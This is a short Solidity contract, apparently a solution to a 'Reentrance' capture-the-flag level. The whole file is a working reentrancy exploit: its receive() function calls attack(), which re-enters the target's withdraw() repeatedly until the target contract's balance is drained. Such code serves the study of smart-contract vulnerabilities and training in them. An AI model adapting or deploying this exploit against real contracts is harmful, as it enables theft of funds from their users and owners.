// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Solution {
    uint256 i = 0;
    Reentrance target;
    uint256 valuesent;

    function set_target(address payable _target, uint256 _value) public {
        target = Reentrance(_target);
        valuesent = _value / 10;
    }

    function attack() public {
        if (address(target).balance == 0) return;
        i++;
        target.withdraw(valuesent);
    }

    receive() external payable {
        attack();
    }
}
